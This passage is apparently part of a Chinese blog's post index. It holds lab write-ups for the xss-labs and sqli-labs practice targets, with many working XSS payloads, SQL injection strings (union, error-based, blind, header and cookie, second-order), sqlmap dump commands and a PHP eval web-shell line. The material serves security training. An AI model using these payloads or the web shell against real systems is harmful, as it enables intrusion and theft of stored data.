条件竞争:也就是先上传再判断是否需要删除。。。。","categories":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"upload","slug":"upload","permalink":"http://example.com/tags/upload/"}]},{"title":"xss-labs靶机练习","slug":"xss-labs/xss-labs","date":"2021-03-26T12:50:43.000Z","updated":"2021-04-23T15:29:18.181Z","comments":true,"path":"2021/03/26/xss-labs/xss-labs/","link":"","permalink":"http://example.com/2021/03/26/xss-labs/xss-labs/","excerpt":"","text":"先上图 leve-1 无任何过滤，get 型，直接&lt;script&gt;alert(1)&lt;/script&gt; 2. 方法一:闭合 input 标签里面的&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 方法二:闭合 value 属性，在 input 标签中添加新的属性&quot; onclick=&quot;alert(11) 3.HTML 实体化过滤 htmlspecialchars 函数可以过滤&lt;``&gt;``&quot;，但是不会过滤单引号，而且 value 的闭合也是采用单引号，所以会有 xss 漏洞 部分源码 12&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; 4.&lt;和&gt;防御机制 先试探防御机制，发现 value 值中把“&lt;”过滤了，所以采用事件注入&quot; onclick=&quot;alert(11)成功弹框 5.ri 和 on 防御机制 ri 替换为 r_i,on 替换为 o_n 过滤了&quot; onclick=&quot;alert(11)``&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;``&quot;&gt;&lt;img src=1 onerror=alert(1) 可以使用新标签&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; 6.ri 和 on,href 防御机制 ri 替换为 r_i,on 替换为 o_n,href 替换成 hr_ef,但是这道题没有过滤大小写。所以 &quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot; 7.script,on 等关键字替换为空 双写绕过 &quot; oonnclick=&quot;alert(11) 8.过滤较全，使用 html 实体编码 这道题过滤有点对，查看源码 1234567891011ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);#大小写过滤$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt; #还有html编码 方法一：html 实体编码:java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) 方法二：fromCharCode()函数:String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 49, 41, 60, 47, 115, 99, 114, 105, 112, 116, 62) 9. 通过试探，这一关与上一关不同的是会在上一关的基础上，加入地址的检查，首先判断会检查哪些内容，这一关会检查输入的数据中是否会有 http：//字段，所以需要在输入的字段中加入该字段 12345678f(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125; payload:java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&#39;http://&#39;) 10.hidden 属性值—隐藏无法触发事件 这一没有输入的地方，需要在 url 地址栏中输入，这一时输入是隐藏的，也就是说 keyname 并不是要注入的地方，真正注入的地方是三个 input，不过这三个被隐藏了，所以需要去试探这三个哪个是正确的，只有 t_sort 是正确的 这里的属性值是可以被替代的，通过再次type=&quot;text&quot;来重新设置属性值，然后添加事件，即可触发弹框 payload:t_sort=&quot;2 type=&quot;text&quot; onclick=&quot;alert(1) 利用 html 的 accesskey 属性t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot; 11.referer 注入 源码，，(不看源码的话。。。没了呀) 1234567891011$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt; 可以看到，这里对 referer 参数替换了&lt;&gt;,没有了其他过滤，对于 t_sort 进行了 HTML 实体化，而且是双引号闭合，所以不会有注入。referer 的 payload:在 hackbar 中传 referer 参数t_ref=2&quot; onclick=&quot;alert(1)&quot; type=&quot;text 12.User-agent 的 xss 注入 和 11 题的原理一样 13.cookie 的 xss 注入 和上述差不多 14.这道题有问题15.ng-include 源码 12345&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;?&gt; 可以看到的是，变量名是“src”，这也没有提示，确实猜不到通过试探，发现所有的输入都会被注视到 ngInclude: 1 之后，所以先了解一下 ngInclude 它的作用ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。也就是说它的参数是一个 html 页面发现在该页面会加载 level1 的页面，我们在 15 页面里面是没有注入点，但是在 1 页面里面有，尝试在 1 里面注入src=&#39;level1.php?name=1&lt;script&gt;alert(1)&lt;/script&gt;&#39;并没有被执行，因为通过 htmlspecialchars($str)函数，有些特殊字符被转码了，转为了 html 实体，所以我们采用其他标签的事件属性触发src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39; 16. 直接在前端页面中修改 img 标签即可。。 源码只是过滤了部分字符，payload&lt;img%0asrc=1%0aonerror=alert(1)&gt; 17-18-19-20– 四道题都一类题，涉及 flash-xss，swf后缀文件–动画软件 Flash 的专用格式，广泛应用于网页设计和动画制作部分源码如下 1234&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt; embed 的语法格式：&lt;embed 属性 1=“属性值 1” 属性 2=“属性值 2”……&gt;payload:?arg01=a&quot; onmouseover=alert(1)&amp;arg02=b但是没反应，不懂了。。。","categories":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"}]},{"title":"sql_labs","slug":"sql-labs/PAGE-1(Basic Challenges)","date":"2021-03-24T12:50:43.000Z","updated":"2021-04-23T15:43:50.377Z","comments":true,"path":"2021/03/24/sql-labs/PAGE-1(Basic Challenges)/","link":"","permalink":"http://example.com/2021/03/24/sql-labs/PAGE-1(Basic%20Challenges)/","excerpt":"","text":"先上图 PAGE-1(Basic Challenges)一、GET 篇1.2 最基本方法 判断注入类型http://127.0.0.1/sqli-labs/Less-1/?id=1正确返回http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;出现报错显示http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=1--+判断字符型和数字型注入的方法这道题感觉好像字符型可以，一般情况下，多是字符型注入 猜测字段数 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 1--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 2--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 3--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 4--+ 字段数为 4 的时候，出现报错Unknown column &#39;4&#39; in &#39;order clause&#39;所以字段数为 3 3. 确定显示的字段顺序因为 sql 语句的执行结果只有第一行会被回显在页面上，所以记住要把前面的值定为空，就会没有显示，这样union的语句的结果才能显示出来http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,3 --+如图 1.1 所示可以看到，2，3，回显成功，所以可以在此处注入 4. 获取当前数据库http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,database(),version()--+获取当前数据库和数据库版本通过内嵌 sql 查询语句得到所有数据库：http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+如图 1.2 所示 5. 获取数据库表名http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) --+ 6. 获取表中的字段名http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) --+ 3-4. 不同于 1 和 2 的&#39;，这是分别采用是&#39;)和&quot;)闭合。。。 123456789$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);if($row)&#123; echo &#39;Your Login name:&#39;. $row[&#39;username&#39;]; echo &#39;Your Password:&#39; .$row[&#39;password&#39;];&#125;else&#123; print_r(mysql_error());&#125; 5.双注入，基于单引号的字符型注入(报错注入，布尔注入，时间延迟注入)看到图，还是有点懵 😳,you are in.....没想到，这里直接可以使用 sqlmap，一把梭哈。。。sqlmap 真是强啊！ 1234sqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --current-dbsqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 -D security --tablessqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 -D security -T users --columnssqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 -D security -T users -C id,password --dump 双注入/二次查询注入：一个 select 语句嵌套另一个 select 语句，里面的 select 语句先执行再执行外边的 select 语句。 concat()：连接两个语句 rand()：随机输出一个小于1的小数 floor()：向下取整 group by()：把结果分组输出 count()：汇总数据函数 手工时间延迟型注入http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and sleep(5)--+延迟回显加载成功_ 爆数据库名长度?id=1&#39; and if(length(database())=8,sleep(5),1)--+_ 爆数据库名的第一个字母id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+_ 爆数据库名的第二个字母id=1&#39; and if(left(database(),2)=&#39;se&#39;,sleep(5),1) --+依次类推，得出数据库名为security_ 爆表名id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;u&#39;,sleep(5),1) --+,依次类推，爆出表名的所有字母 &gt; limit 的例子—查询 8 条数据，索引从 5 到 12，第 6 条记录到第 13 条记录select _ from t_user limit 5,8;_ 爆字段?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)--+ * 查看对应字段内容?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+通过 id 进行排序 布尔型注入正确会回显，错误没有回显:若数据库的搜字母小于 t，则有回显，反之，则没有回显id=1&#39; and left((select database()),1)&lt;&#39;t&#39;--+ * 接下里的步骤和手工时间注入差不多，只是少了个 if 判断语句 报错注入主要可以分为三类：通过 floor 报错，通过 updatexml 报错，exp 报错_ floor:and (select 1 from (select count(_),concat((payload),floor (rand(0)_2))x from information_schema.tables group by x)a) 其中payload为你要插入的SQL语句 需要注意的是该语句将 输出字符长度限制为64个字符 查询表名:id=1&#39; and (select 1 from (select count(_),concat((select table\\*name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor (rand(0)\\_2))x from information_schema.tables group by x)a)--+ updatexml:`and updatexml(1,payload,1)同样该语句对输出的字符长度也做了限制，其最长输出 32 位并且该语句对 payload 的反悔类型也做了限制，只有在 payload 返回的不是 xml 格式才会生效 * exp 6. 双注入，基于双引号的字符型注入 相较于 less-5，这里使用了&quot;闭合…. 7.字符型注入，基于单引号变形注入之导入文件 导入文件这块，还是很陌生。。 id=1&#39;))--+正常回显，得到闭合方式 id=1&#39;)) order by 3得到字段数 导入文件步骤：1.知道数据库的路径。。2. 输入id=-1&#39;)) union select &#39;&#39;,&#39;&#39;,3 into outfile &quot;/var/www/html/sqli-labs/1.txt&quot;--+但是此处输入 sql 语句后，报错:权限不允许。 注意:mysql 数据库的配置 secure_file_priv（设置默认为 NULL，限制导入导出） mysql5.0.x 版本以下默认可导出导入。 secure_file_priv 要设置为空。。 然而设置我，我还是还是没有权限 还是无法导出。。。。 此处还可以导出一句话木马1’)) union select 1,2,&quot;&lt;?php @eval($_POST[value]);?&gt;&quot; into outfile &#39;/var/www/html/1.txt&#39;但是我还没有实现。。。。。 时间注入也是可以实现。。id=1&#39;)) and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+ 布尔注入也是可以实现..id=1&#39;)) and left(database(),1)&gt;&#39;t&#39;--+ 报错注入也可以实现。。1&#39;)) and (select 1 from (select count(*),concat((select version()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+ 8.盲注入，基于单引号的字符型注入 输入1&#39;,正常显示；1&#39;--+，没有正常回显，也没有报错提示，所以排除报错注入。。 时间延迟注入 爆库名:id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+ 爆表名:id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1)=&#39;u&#39;,sleep(5),1)--+这里需要注意，mysql 显示的数据库表格中的数据是从下往上数的。 可能是靶机的问题，在爆字段名的时候发生了问题，当爆第二个字段名时，payload 无效 布尔注入 爆库名:left():id=1&#39; and left((select database()),1)=&#39;s&#39; --+ascii():id=1&#39; and ascii(substr(database(),1,1))=115--+ 爆表名:id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1)=&#39;u&#39;--+ascii()法也可以。。。 9.盲注入，基于单引号的时间延迟注入10.盲注，基于双引号的时间延迟注入 和上文中的时间延迟注入差不多。。。 二、POST 篇11.基于单引号的 POST 注入 方法一:sqlmap 一把梭哈 12345step1：sqlmap -r [&quot;请求头文本&quot;] &#x2F;&#x2F;测试是否存在注入step2：sqlmap -r [&quot;请求头文本&quot;] --current-db &#x2F;&#x2F;查询当前数据库step3：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] --tables &#x2F;&#x2F;查询当前数据库的所有表step4：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns &#x2F;&#x2F;查询指定库指定表的所有列step5：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] -C [&quot;列名&quot;] --dump &#x2F;&#x2F;打印出指定库指定表指定列的所有字段内容 方法二：=admin&#39;&amp;passwd=admin&amp;submit=Submit,回显报错。=admin&#39;--+&amp;passwd=admin&amp;submit=Submit,登陆成功_ 判断字段个数:=admin&#39; order by 2--+&amp;passwd=admin&amp;submit=Submit回显报错。最多两个字段_ 爆数据库:=-1&#39; union select version(),database()--+&amp;passwd=admin&amp;submit=Submit,得到数据库和版本的回显接下来的步骤就和上篇的 get 注入方法一致了。 方法三:因为有报错回显，其实也可以选择通过报错注入。_ 爆库名:=1&#39;and (select 1 from (select count(_),concat((select database()),floor (rand(0)\\*2))x from information_schema.tables group by x)a)--+&amp;passwd=admin&amp;submit=Submit,依然回显正常，得到库名，接下来的步骤就和上篇的 get 注入方法一致了。 12.基于双引号加单括号&quot;)的 POST 注入 和上文提及步骤一样 13.基于&#39;)的 POST 盲注入 闭合判断，通过order by判断字段名，回显报错。。=admin&#39;)--+&amp;passwd=admin&amp;submit=Submit登陆成功后没有回显，所以不能通过 union 关键字注入，但是会报错，所以存在报错注入 报错:and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+&amp;passwd=admin&amp;submit=Submit爆库成功。。接下来的步骤就不赘述了 时间注入:=admin&#39;) and if((select database())=&#39;security&#39;,sleep(2),1)--+&amp;passwd=admin&amp;submit=Submit 布尔注入:=admin&#39;) and (select database())=&#39;security&#39;--+&amp;passwd=admin&amp;submit=Submit 14.基于&quot;的 POST 注入 和 13 题一样，登陆之后没有回显，但是会报错，解题步骤也和上面一样 15.基于单引号的无回显盲注入 由于没有错误回显，所以无法使用报错回显 方法一:时间延迟注入 方法二:布尔注入 16.基于双引号&quot;)的无回显盲注入 和 15 题的思路一样 17.基于 password 的更新查询 POST 报错注入 尝试闭合字符，都不能成功，查看PHP源码，存在以下的过滤机制 12345678910111213141516171819202122232425function check_input($con1, $value)&#123; if(!empty($value)) &#123; &#x2F;&#x2F; truncation (see comments) $value &#x3D; substr($value,0,15); &#125; &#x2F;&#x2F; Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value &#x3D; stripslashes($value); &#125; &#x2F;&#x2F; Quote if not a number if (!ctype_digit($value)) &#123; $value &#x3D; &quot;&#39;&quot; . mysqli_real_escape_string($con1, $value) . &quot;&#39;&quot;; &#125; else &#123; $value &#x3D; intval($value); &#125; return $value;&#125; substr:分割前 15 个字符 magic_quotes_gpc(): 总结如下： 1.对于PHP magic_quotes_gpc=on的情况， 我们可以不对输入和输出数据库的字符串数据作addslashes()和 stripslashes()的操作,数据也会正常显示。如果此时你对输入的数据作了 addslashes()处理，那么在输出的时候就必须使用 stripslashes()去掉多余的反斜杠。 2.对于 PHP magic_quotes_gpc=off 的情况必须使用 addslashes()对输入数据进行处理，但并不需要使用 stripslashes()格式化输出因为 addslashes()并未将反斜杠一起写入数据库，只是帮助 mysql 完成了 sql 语句的执行。 1234stripslashes():删除由 addslashes() 函数添加的反斜杠ctype_digit():判断是不是数字，是数字就返回true，否则返回falsemysql_real_escape_string():转义 SQL 语句中使用的字符串中的特殊字符。intval(): 整型转换 这里好像用不了 floor 取整报错方法，选择使用 updatexml 函数：admin&#39;and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+成功回显版本 爆库名:admin&#39;and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+,回显库名成功 爆表名:admin&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)--+回显表名成功 爆列名:=admin&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;USER&#39;,&#39;CURRENT_CONNECTIONS&#39;,&#39;TOTAL_CONNECTIONS&#39;)),0x7e),1)--+这里的 column 列名要进行筛选，使用and not in语句。。回显成功 爆值:admin&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(CURRENT_CONNECTIONS) from users),0x7e),1)--+这里出现了问题，如 17.1 图所示admin&#39;and updatexml(1,concat(0x7e,(select user_id from(SELECT user_id from users where username=&#39;admin&#39;)mingzi),0x7e),1)--+还是报错…..如图 17.2 所示 18.基于错误的用户代理，头部 POST 注入 很不一样，这道题在主页给出了我的 IP 地址。。。如图 18.1怎么办呢？返回了我的 UA，所以注入可能在这里看 PHP 源码，对 uname 和 passwd 都进行了过滤。 为何 host 头存在注入，这个也比较少见，但是知道只要和数据库有交互就有可能存在注入……可以看到 uname 和 passwd 都进行了过滤，这里有个注意点，在平常的渗透中，当输入点没有注入，可以想想是否在其他地方有注入，程序员对于普通用户的输入点过滤严格，但是其他地方却没有进行过滤，导致了注入的发生，也是需要我们多多注意 123456789101112131415161718if($row1) &#123; echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;; $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; mysqli_query($con1, $insert); &#x2F;&#x2F;echo &#39;Your IP ADDRESS is: &#39; .$IP; echo &quot;&lt;&#x2F;font&gt;&quot;; &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;; echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size &#x3D; 3 &gt;&#39;; echo &#39;Your User Agent is: &#39; .$uagent; echo &quot;&lt;&#x2F;font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysqli_error($con1)); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot; &#x2F;&gt;&#39;; echo &quot;&lt;br&gt;&quot;; &#125; 注意:这里不能使用--+来注释后面的内容，导致插入语句不完整。。。构造前后闭合。。。 爆库:User-Agent: &#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;1&#39;=&#39;1 爆表名:User-Agent: &#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39;=&#39;1后面步骤不赘述了 19.基于头部的 Referer POST 报错注入 回显提示： 从源码看出，insert 语句中向数据库插入了 referer，所以注入点改为 referer，和 18 题注入方法一样。。。 20.Cookie injections - Uagent field - Error based (基于错误的 cookie 头部 POST 注入) 好吧。果然 page-2 的就是不一样，sqlmap 居然跑不出来，只能手工了。。。。原来是 cookie 注入，这里 sqlmap 使用时，要多加-cookie参数如sqlmap -u /sqli-labs/Less-20/index.php -cookie &quot;uname=admin&quot; -level 3 先看 php 源码，有点长，有点复杂 setcookie(name(cookie 名称),value,expire(有效时间),path,domain,secure)函数:向客户端发送一个 HTTP cookie mysqli_fetch_array():函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有。注释：该函数返回的字段名是区分大小写的。 header() 函数:向客户端发送原始的 HTTP 报头。 通过 burp 抓包，可以发现在输入 uname 和 pass 输入之后，会向客户端发生 cookie 值。点击 submit 之后，显示信息。。 源码中可以看到，没有对 cookie 进行任何过滤，就和数据库交互，所以存在 cookie 注入。。 爆字段名–&gt;爆库名–&gt;爆表名–&gt;爆字段名–&gt;爆值，，详细操作和 less-1 的注入类似。 21.基于 cookie 的复杂字符型型注入 和 20 题不同的是，这里的 uname 的值是要进过 base64 进行解密后才和数据库进行交互，所以需要把注入语句进行 base64 加密。。部分源码如下： 12345echo &quot;YOUR COOKIE : uname &#x3D; $cookee and expires: &quot; . date($format, $timestamp); $cookee &#x3D; base64_decode($cookee); echo &quot;&lt;br&gt;&lt;&#x2F;font&gt;&quot;; $sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;(&#39;$cookee&#39;) LIMIT 0,1&quot;; sqlmap 使用脚本新用法: sqlmap -u url --tamper /usr/share/sqlmap/tamper/base64encode.py --cookie=&quot;uname=YWRtaW4%3D&quot; -level 3 手工注入 这里--+和#不能使用，所以选择用and &#39;1&#39;=&#39;1来进行闭合 报错注入:admin&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#39;1&#39;=&#39;1base64 后:YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSksMSkgYW5kICcxJz0nMQ==注入成功。。 成功爆库:admin&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39;=&#39;1接下来的步骤不再啰嗦 22.基于双引号闭合的 cookie 的复杂字符型型注入 相对于 21 题，只是通过双引号闭合 PAGE-2(Advanced Injections)23.基于错误的，过滤注释的 get 型 updatexml 报错注入成功，那这道题的考点呢？部分源码 123456&#x2F;&#x2F;filter the comments out so as to comments should not work$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;$replace &#x3D; &quot;&quot;;$id &#x3D; preg_replace($reg, $replace, $id);$id &#x3D; preg_replace($reg1, $replace, $id); 对 id 进行了#和--的过滤。。可以通过and &#39;1&#39;=&#39;1来闭合即可 24.二次注入 原理： 第一步：插入恶意代码，向数据库插入数据的时候，虽然对特殊字符串进行了转义，但写入数据库的时候还保留了原来的内容（不管有没有发生转义），使得数据本身已经包含恶意内容 第二步：引用恶意数据，恶意数据写入数据库中，在利用查询读取恶意数据，没有检查，就会造成 SQL 的二次注入 源码 123456789# Validating the user input........ $username&#x3D; $_SESSION[&quot;username&quot;]; $curr_pass&#x3D; mysqli_real_escape_string($con1, $_POST[&#39;current_password&#39;]); $pass&#x3D; mysqli_real_escape_string($con1, $_POST[&#39;password&#39;]); $re_pass&#x3D; mysqli_real_escape_string($con1, $_POST[&#39;re_password&#39;]); if($pass&#x3D;&#x3D;$re_pass) &#123; $sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;; 可以发现，这里对 usename 没有进行任何的过滤，所以通过构造 payload 可以修改任意的密码 构造 payload admin’# 即可闭合 sql 语句 使得 password=$curr_pass 不起作用首先创建用户 admin’# 登录此用户，之后修改密码，修改后尝试登录 admin 用户，发现登录成功。 25.过滤了含有or的AND字符串，替换为””(空值) 源码 1234567function blacklist($id)&#123; $id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out OR (non case sensitive) $id&#x3D; preg_replace(&#39;&#x2F;AND&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out AND (non case sensitive) return $id;&#125; 方法一:双写绕过 延迟时间注入:id=1&#39; aandnd sleep(10)--+ 有必要说一下这题在爆值的时候对 password 进行了处理，查询 password 列，回显 no column passwd，所以双写 or 绕过同理 information 也是。 ?id=-1&#39; union select 1,2,database()--+没有关键字，可以成功注入 or可以用||替换，有一个为真则为 1，可用在用于盲注判断and可以用&amp;&amp;替换。 26.过滤空格和注释的一般注入 部分源码 1234567891011121314151617181920212223242526272829303132function blacklist($id)&#123; $id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out OR (non case sensitive) $id&#x3D; preg_replace(&#39;&#x2F;and&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out AND (non case sensitive) $id&#x3D; preg_replace(&#39;&#x2F;[\\&#x2F;\\*]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out &#x2F;* $id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out -- $id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out # $id&#x3D; preg_replace(&#39;&#x2F;[\\s]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces $id&#x3D; preg_replace(&#39;&#x2F;[\\&#x2F;\\\\\\\\]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out slashes return $id;&#125;空格和注释无法使用绕过空格的几种%09 tab键%0a 新建一行%0c 新的一页%od return功能%0b tab键垂直%a0 空格##这里无法识别() 又是也可以代替空格+ 也可代替空格用%0a替代空格使用，用&amp;&amp;(%26%26)替代AND使用构造payload： 0&#39;%0aUNION%0aSELECT%0a1,version(),database()%26%26%0a&#39;1这道题还可以使用盲注实现0&#39;||left(database(),1)&#x3D;&#39;s&#39;%26%26&#39;1&#39;&#x3D;&#39;1同样报错注入也可以实现0&#39;||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||&#39;1&#39;&#x3D;&#39;1只要将空格和and绕过 那么实现就简单了or和and 很好过滤，注释过滤了就使用永真闭合， 26a.过滤空格和注释的盲注 没有报错显示，可以使用时间延迟注入和布尔注入。 27.基于单引号闭合，过滤空格，注释，Union 和 select 等关键字 因为规定的字符格式，所以可以选择不同的大小写搭配仍可绕过 总结下 冒号可以做闭合用， %00 用来截断 这样和注释有相同的含义，这下绕过就多了：注释，分号闭合-冒号%00 截断，恒等式闭合 大小写绕过，双写绕过 爆库:?id=0&#39;%0aUnioN%0aSeleCT%0a1,version(),database();%00回显成功 27a: 相比 27 题，只是闭合符号不同，这里是双引号，上一题是单引号 28. 只是过滤了 union 和 select 不能再一起使用，仍然没有限制大小写绕过 